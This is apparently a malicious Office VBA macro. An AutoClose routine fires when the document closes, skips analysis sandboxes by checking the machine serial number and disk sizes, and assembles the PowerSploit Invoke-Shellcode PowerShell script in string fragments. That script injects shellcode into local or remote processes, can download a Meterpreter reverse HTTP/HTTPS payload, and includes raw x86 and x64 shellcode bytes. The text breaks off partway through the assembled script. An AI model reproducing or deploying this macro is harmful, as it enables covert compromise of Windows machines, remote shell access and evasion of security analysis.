Sub AutoClose()
        jSpbK
End Sub

Public Function jSpbK() As Variant
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
        Set ID = objWMIService.ExecQuery("Select IdentifyingNumber from Win32_ComputerSystemproduct")
        For Each objItem In ID
                If StrComp(objItem.IdentifyingNumber, "2UA20511KN") = 0 Then End
        Next
        Set disksize = objWMIService.ExecQuery("Select Size from Win32_logicaldisk")
        For Each objItem In disksize
                If (objItem.Size = 42949603328#) Then End
                If (objItem.Size = 68719443968#) Then End
        Next
        Dim PIq As String
        PIq = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        PIq = PIq + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        PIq = PIq + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        PIq = PIq + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        PIq = PIq + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        PIq = PIq + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        PIq = PIq + "    $Shellcode,
    [Parameter( ParameterSetName ="
        PIq = PIq + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        PIq = PIq + "reter/reverse_http',
                  'windows/me"
        PIq = PIq + "terpreter/reverse_https',
                  Ignore"
        PIq = PIq + "Case = $True )]
    [String]
    $Payload = 'windo"
        PIq = PIq + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        PIq = PIq + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        PIq = PIq + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        PIq = PIq + " = $True,
                ParameterSetName = 'Meta"
        PIq = PIq + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        PIq = PIq + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        PIq = PIq + "datory = $True,
                ParameterSetName ="
        PIq = PIq + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        PIq = PIq + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        PIq = PIq + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        PIq = PIq + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        PIq = PIq + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        PIq = PIq + "sion\Internet Settings').'User Agent',
    [Parame"
        PIq = PIq + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        PIq = PIq + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        PIq = PIq + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        PIq = PIq + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        PIq = PIq + "$False,
    [Switch]
    $Force = $False
)
    Set"
        PIq = PIq + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        PIq = PIq + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        PIq = PIq + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        PIq = PIq + "meters['Payload'].Attributes |
            Where-O"
        PIq = PIq + "bject {$_.TypeId -eq [System.Management.Automation"
        PIq = PIq + ".ValidateSetAttribute]}
        foreach ($Payload "
        PIq = PIq + "in $AvailablePayloads.ValidValues)
        {
     "
        PIq = PIq + "       New-Object PSObject -Property @{ Payloads ="
        PIq = PIq + " $Payload }
        }
        Return
    }
    if "
        PIq = PIq + "( $PSBoundParameters['ProcessID'] )
    {
        "
        PIq = PIq + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        PIq = PIq + "-Null
    }
    function Local:Get-DelegateType
  "
        PIq = PIq + "  {
        Param
        (
            [OutputTyp"
        PIq = PIq + "e([Type])]
            [Parameter( Position = 0)]
"
        PIq = PIq + "            [Type[]]
            $Parameters = (Ne"
        PIq = PIq + "w-Object Type[](0)),
            [Parameter( Posit"
        PIq = PIq + "ion = 1 )]
            [Type]
            $ReturnT"
        PIq = PIq + "ype = [Void]
        )
        $Domain = [AppDomai"
        PIq = PIq + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        PIq = PIq + "t System.Reflection.AssemblyName('ReflectedDelegat"
        PIq = PIq + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        PIq = PIq + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        PIq = PIq + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        PIq = PIq + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        PIq = PIq + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        PIq = PIq + "der.DefineType('MyDelegateType', 'Class, Public, S"
        PIq = PIq + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        PIq = PIq + "egate])
        $ConstructorBuilder = $TypeBuilder"
        PIq = PIq + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        PIq = PIq + "ic', [System.Reflection.CallingConventions]::Stand"
        PIq = PIq + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        PIq = PIq + "mplementationFlags('Runtime, Managed')
        $Me"
        PIq = PIq + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        PIq = PIq + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        PIq = PIq + ", $Parameters)
        $MethodBuilder.SetImplement"
        PIq = PIq + "ationFlags('Runtime, Managed')
        Write-Outpu"
        PIq = PIq + "t $TypeBuilder.CreateType()
    }
    function Loc"
        PIq = PIq + "al:Get-ProcAddress
    {
        Param
        (
 "
        PIq = PIq + "           [OutputType([IntPtr])]
            [Par"
        PIq = PIq + "ameter( Position = 0, Mandatory = $True )]
       "
        PIq = PIq + "     [String]
            $Module,
            [Pa"
        PIq = PIq + "rameter( Position = 1, Mandatory = $True )]
      "
        PIq = PIq + "      [String]
            $Procedure
        )
  "
        PIq = PIq + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        PIq = PIq + ".GetAssemblies() |
            Where-Object { $_.G"
        PIq = PIq + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        PIq = PIq + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        PIq = PIq + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        PIq = PIq + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        PIq = PIq + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        PIq = PIq + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        PIq = PIq + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        PIq = PIq + "eropServices.HandleRef], [String]))
        $Kern3"
        PIq = PIq + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        PIq = PIq + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        PIq = PIq + "ndleRef = New-Object System.Runtime.InteropService"
        PIq = PIq + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        PIq = PIq + "Output $GetProcAddress.Invoke($null, @([System.Run"
        PIq = PIq + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        PIq = PIq + "ure))
    }
    function Local:Emit-CallThreadStub"
        PIq = PIq + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        PIq = PIq + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        PIq = PIq + "chitecture / 8
        function Local:ConvertTo-Li"
        PIq = PIq + "ttleEndian ([IntPtr] $Address)
        {
         "
        PIq = PIq + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        PIq = PIq + "           $Address.ToString("X$($IntSizePtr*2)") "
        PIq = PIq + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        PIq = PIq + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        PIq = PIq + " } }
            [System.Array]::Reverse($LittleEn"
        PIq = PIq + "dianByteArray)
            Write-Output $LittleEnd"
        PIq = PIq + "ianByteArray
        }
        $CallStub = New-Obj"
        PIq = PIq + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        PIq = PIq + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        PIq = PIq + "                   # MOV   QWORD RAX, &shellcode
 "
        PIq = PIq + "           $CallStub += ConvertTo-LittleEndian $Ba"
        PIq = PIq + "seAddr       # &shellcode
            $CallStub +="
        PIq = PIq + " 0xFF,0xD0                              # CALL  RA"
        PIq = PIq + "X
            $CallStub += 0x6A,0x00              "
        PIq = PIq + "                # PUSH  BYTE 0
            $CallSt"
        PIq = PIq + "ub += 0x48,0xB8                              # MOV"
        PIq = PIq + "   QWORD RAX, &ExitThread
            $CallStub +="
        PIq = PIq + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        PIq = PIq + "ead
            $CallStub += 0xFF,0xD0            "
        PIq = PIq + "                  # CALL  RAX
        }
        el"
        PIq = PIq + "se
        {
            [Byte[]] $CallStub = 0xB8"
        PIq = PIq + "                           # MOV   DWORD EAX, &she"
        PIq = PIq + "llcode
            $CallStub += ConvertTo-LittleEn"
        PIq = PIq + "dian $BaseAddr       # &shellcode
            $Cal"
        PIq = PIq + "lStub += 0xFF,0xD0                              # "
        PIq = PIq + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        PIq = PIq + "                        # PUSH  BYTE 0
           "
        PIq = PIq + " $CallStub += 0xB8                                "
        PIq = PIq + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        PIq = PIq + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        PIq = PIq + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        PIq = PIq + "                          # CALL  EAX
        }
  "
        PIq = PIq + "      Write-Output $CallStub
    }
    function Lo"
        PIq = PIq + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        PIq = PIq + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        PIq = PIq + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        PIq = PIq + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        PIq = PIq + "        Throw "Unable to open a process handle for"
        PIq = PIq + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        PIq = PIq + "lse
        if ($64bitCPU) # Only perform theses c"
        PIq = PIq + "hecks if CPU is 64-bit
        {
            $IsWo"
        PIq = PIq + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        PIq = PIq + "-Null
            if ((!$IsWow64) -and $PowerShell"
        PIq = PIq + "32bit)
            {
                Throw 'Unable"
        PIq = PIq + " to inject 64-bit shellcode from within 32-bit Pow"
        PIq = PIq + "ershell. Use the 64-bit version of Powershell if y"
        PIq = PIq + "ou want this to work.'
            }
            e"
        PIq = PIq + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        PIq = PIq + "  {
                if ($Shellcode32.Length -eq 0)"
        PIq = PIq + "
                {
                    Throw 'No s"
        PIq = PIq + "hellcode was placed in the $Shellcode32 variable!'"
        PIq = PIq + "
                }
                $Shellcode = $S"
        PIq = PIq + "hellcode32
            }
            else # 64-bit"
        PIq = PIq + " process
            {
                if ($Shellc"
        PIq = PIq + "ode64.Length -eq 0)
                {
            "
        PIq = PIq + "        Throw 'No shellcode was placed in the $She"
        PIq = PIq + "llcode64 variable!'
                }
            "
        PIq = PIq + "    $Shellcode = $Shellcode64
            }
      "
        PIq = PIq + "  }
        else # 32-bit CPU
        {
          "
        PIq = PIq + "  if ($Shellcode32.Length -eq 0)
            {
   "
        PIq = PIq + "             Throw 'No shellcode was placed in the"
        PIq = PIq + " $Shellcode32 variable!'
            }
           "
        PIq = PIq + " $Shellcode = $Shellcode32
        }
        $Remo"
        PIq = PIq + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        PIq = PIq + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        PIq = PIq + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        PIq = PIq + ")
        {
            Throw "Unable to allocate "
        PIq = PIq + "shellcode memory in PID: $ProcessID"
        }
   "
        PIq = PIq + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        PIq = PIq + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        PIq = PIq + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        PIq = PIq + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        PIq = PIq + "      {
            $CallStub = Emit-CallThreadStu"
        PIq = PIq + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        PIq = PIq + "    else
        {
            $CallStub = Emit-Ca"
        PIq = PIq + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        PIq = PIq + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        PIq = PIq + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        PIq = PIq + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        PIq = PIq + "(!$RemoteStubAddr)
        {
            Throw "Un"
        PIq = PIq + "able to allocate thread call stub memory in PID: $"
        PIq = PIq + "ProcessID"
        }
        $WriteProcessMemory.I"
        PIq = PIq + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        PIq = PIq + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        PIq = PIq + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        PIq = PIq + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        PIq = PIq + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        PIq = PIq + "  {
            Throw "Unable to launch remote thr"
        PIq = PIq + "ead in PID: $ProcessID"
        }
        $CloseHa"
        PIq = PIq + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        PIq = PIq + "on Local:Inject-LocalShellcode
    {
        if ($"
        PIq = PIq + "PowerShell32bit) {
            if ($Shellcode32.Le"
        PIq = PIq + "ngth -eq 0)
            {
                Throw 'N"
        PIq = PIq + "o shellcode was placed in the $Shellcode32 variabl"
        PIq = PIq + "e!'
                return
            }
         "
        PIq = PIq + "   $Shellcode = $Shellcode32
        }
        els"
        PIq = PIq + "e
        {
            if ($Shellcode64.Length -e"
        PIq = PIq + "q 0)
            {
                Throw 'No shell"
        PIq = PIq + "code was placed in the $Shellcode64 variable!'
   "
        PIq = PIq + "             return
            }
            $She"
        PIq = PIq + "llcode = $Shellcode64
        }
        $BaseAddre"
        PIq = PIq + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        PIq = PIq + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        PIq = PIq + "X)
        if (!$BaseAddress)
        {
          "
        PIq = PIq + "  Throw "Unable to allocate shellcode memory in PI"
        PIq = PIq + "D: $ProcessID"
        }
        [System.Runtime.I"
        PIq = PIq + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        PIq = PIq + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        PIq = PIq + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        PIq = PIq + "  if ($PowerShell32bit)
        {
            $Cal"
        PIq = PIq + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        PIq = PIq + "adAddr 32
        }
        else
        {
       "
        PIq = PIq + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        PIq = PIq + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        PIq = PIq + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        PIq = PIq + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        PIq = PIq + "X)
        if (!$CallStubAddress)
        {
      "
        PIq = PIq + "      Throw "Unable to allocate thread call stub.""
        PIq = PIq + "
        }
        [System.Runtime.InteropServices"
        PIq = PIq + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        PIq = PIq + "allStub.Length)
        $ThreadHandle = $CreateThr"
        PIq = PIq + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        PIq = PIq + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        PIq = PIq + "dHandle)
        {
            Throw "Unable to la"
        PIq = PIq + "unch thread."
        }
        $WaitForSingleObje"
        PIq = PIq + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        PIq = PIq + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        PIq = PIq + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        PIq = PIq + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        PIq = PIq + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        PIq = PIq + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        PIq = PIq + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        PIq = PIq + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        PIq = PIq + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        PIq = PIq + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        PIq = PIq + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        PIq = PIq + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        PIq = PIq + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        PIq = PIq + "  else
    {
        $64bitCPU = $false
    }
    "
        PIq = PIq + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        PIq = PIq + "l32bit = $true
    }
    else
    {
        $Power"
        PIq = PIq + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        PIq = PIq + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        PIq = PIq + "owerShell32bit) {
            $RootInvocation = $M"
        PIq = PIq + "yInvocation.Line
            $Response = $True
   "
        PIq = PIq + "         if ( $Force -or ( $Response = $psCmdlet.S"
        PIq = PIq + "houldContinue( "Do you want to launch the payload "
        PIq = PIq + "from x86 Powershell?",
                   "Attempt"
        PIq = PIq + " to execute 32-bit shellcode from 64-bit Powershel"
        PIq = PIq + "l. Note: This process takes about one minute. Be p"
        PIq = PIq + "atient! You will also see some artifacts of the sc"
        PIq = PIq + "ript loading in the other process." ) ) ) { }
    "
        PIq = PIq + "        if ( !$Response )
            {
          "
        PIq = PIq + "      Return
            }
            if ($MyInvo"
        PIq = PIq + "cation.BoundParameters['Force'])
            {
   "
        PIq = PIq + "             $Command = "function $($MyInvocation."
        PIq = PIq + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        PIq = PIq + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        PIq = PIq + "   }
            else
            {
              "
        PIq = PIq + "  $Command = "function $($MyInvocation.InvocationN"
        PIq = PIq + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        PIq = PIq + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        PIq = PIq + "
            $CommandBytes = [System.Text.Encoding"
        PIq = PIq + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        PIq = PIq + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        PIq = PIq + "           $Execute = '$Command' + " | $Env:windir"
        PIq = PIq + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        PIq = PIq + "oProfile -Command -"
            Invoke-Expression"
        PIq = PIq + " -Command $Execute | Out-Null
            Return
 "
        PIq = PIq + "       }
        $Response = $True
        if ( $F"
        PIq = PIq + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        PIq = PIq + "Do you know what you're doing?",
               "A"
        PIq = PIq + "bout to download Metasploit payload '$($Payload)' "
        PIq = PIq + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        PIq = PIq + "  if ( !$Response )
        {
            Return
 "
        PIq = PIq + "       }
        switch ($Payload)
        {
     "
        PIq = PIq + "       'windows/meterpreter/reverse_http'
        "
        PIq = PIq + "    {
                $SSL = ''
            }
    "
        PIq = PIq + "        'windows/meterpreter/reverse_https'
      "
        PIq = PIq + "      {
                $SSL = 's'
               "
        PIq = PIq + " [System.Net.ServicePointManager]::ServerCertifica"
        PIq = PIq + "teValidationCallback = {$True}
            }
     "
        PIq = PIq + "   }
        if ($Legacy)
        {
            $R"
        PIq = PIq + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        PIq = PIq + "
        } else {
            $CharArray = 48..57 "
        PIq = PIq + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        PIq = PIq + "         $SumTest = $False
            while ($Sum"
        PIq = PIq + "Test -eq $False)
            {
                $Ge"
        PIq = PIq + "neratedUri = $CharArray | Get-Random -Count 4
    "
        PIq = PIq + "            $SumTest = (([int[]] $GeneratedUri | M"
        PIq = PIq + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        PIq = PIq + "  }
            $RequestUri = -join $GeneratedUri
"
        PIq = PIq + "            $Request = "http$($SSL)://$($Lhost):$("
        PIq = PIq + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        PIq = PIq + "ew-Object Uri($Request)
        $WebClient = New-O"
        PIq = PIq + "bject System.Net.WebClient
        $WebClient.Head"
        PIq = PIq + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        PIq = PIq + "roxy)
        {
            $WebProxyObject = New-"
        PIq = PIq + "Object System.Net.WebProxy
            $ProxyAddre"
        PIq = PIq + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        PIq = PIq + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        PIq = PIq + "oxyServer
            if ($ProxyAddress)
         "
        PIq = PIq + "   {
                $WebProxyObject.Address = $Pr"
        PIq = PIq + "oxyAddress
                $WebProxyObject.UseDefa"
        PIq = PIq + "ultCredentials = $True
                $WebClientO"
        PIq = PIq + "bject.Proxy = $WebProxyObject
            }
      "
        PIq = PIq + "  }
        try
        {
            [Byte[]] $Sh"
        PIq = PIq + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        PIq = PIq + "}
        catch
        {
            Throw "$($Er"
        PIq = PIq + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        PIq = PIq + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        PIq = PIq + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        PIq = PIq + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        PIq = PIq + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        PIq = PIq + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        PIq = PIq + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        PIq = PIq + "                             0x52,0x0c,0x8b,0x52,0"
        PIq = PIq + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        PIq = PIq + "x31,0xc0,
                                  0xac,0"
        PIq = PIq + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        PIq = PIq + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        PIq = PIq + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        PIq = PIq + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        PIq = PIq + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        PIq = PIq + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        PIq = PIq + "x8b,
                                  0x01,0xd6,0"
        PIq = PIq + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        PIq = PIq + "x38,0xe0,0x75,0xf4,
                              "
        PIq = PIq + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        PIq = PIq + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        PIq = PIq + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        PIq = PIq + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        PIq = PIq + "                                  0x5b,0x5b,0x61,0"
        PIq = PIq + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        PIq = PIq + "xeb,0x86,0x5d,
                                  0"
        PIq = PIq + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        PIq = PIq + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        PIq = PIq + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        PIq = PIq + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        PIq = PIq + "                             0x80,0xfb,0xe0,0x75,0"
        PIq = PIq + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        PIq = PIq + "xd5,0x63,
                                  0x61,0"
        PIq = PIq + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        PIq = PIq + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        PIq = PIq + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        PIq = PIq + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        PIq = PIq + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        PIq = PIq + "                             0x20,0x48,0x8b,0x72,0"
        PIq = PIq + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        PIq = PIq + "x31,0xc0,
                                  0xac,0"
        PIq = PIq + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        PIq = PIq + "x41,0x01,0xc1,0xe2,0xed,
                         "
        PIq = PIq + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        PIq = PIq + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        PIq = PIq + "                        0x00,0x00,0x00,0x48,0x85,0"
        PIq = PIq + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        PIq = PIq + "x44,
                                  0x8b,0x40,0"
        PIq = PIq + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        PIq = PIq + "x8b,0x34,0x88,0x48,
                              "
        PIq = PIq + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        PIq = PIq + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        PIq = PIq + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        PIq = PIq + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        PIq = PIq + "                                  0x8b,0x40,0x24,0"
        PIq = PIq + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        PIq = PIq + "x40,0x1c,0x49,
                                  0"
        PIq = PIq + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        PIq = PIq + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        PIq = PIq + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        PIq = PIq + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        PIq = PIq + "                             0x59,0x5a,0x48,0x8b,0"
        PIq = PIq + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        PIq = PIq + "x00,0x00,
                                  0x00,0"
        PIq = PIq + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        PIq = PIq + "x00,0x41,0xba,0x31,0x8b,
                         "
        PIq = PIq + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        PIq = PIq + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        PIq = PIq + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        PIq = PIq + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        PIq = PIq + "x47,
                                  0x13,0x72,0"
        PIq = PIq + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        PIq = PIq + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        PIq = PIq + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        PIq = PIq + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        PIq = PIq + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        PIq = PIq + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        PIq = PIq + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        PIq = PIq + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        PIq = PIq + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        PIq = PIq + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        PIq = PIq + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        PIq = PIq + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        PIq = PIq + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        PIq = PIq + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        PIq = PIq + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        PIq = PIq + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        PIq = PIq + "ernel32.dll WriteProcessMemory
        $WriteProce"
        PIq = PIq + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        PIq = PIq + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        PIq = PIq + "()) ([Bool])
        $WriteProcessMemory = [System"
        PIq = PIq + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        PIq = PIq + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        PIq = PIq + "essMemoryDelegate)
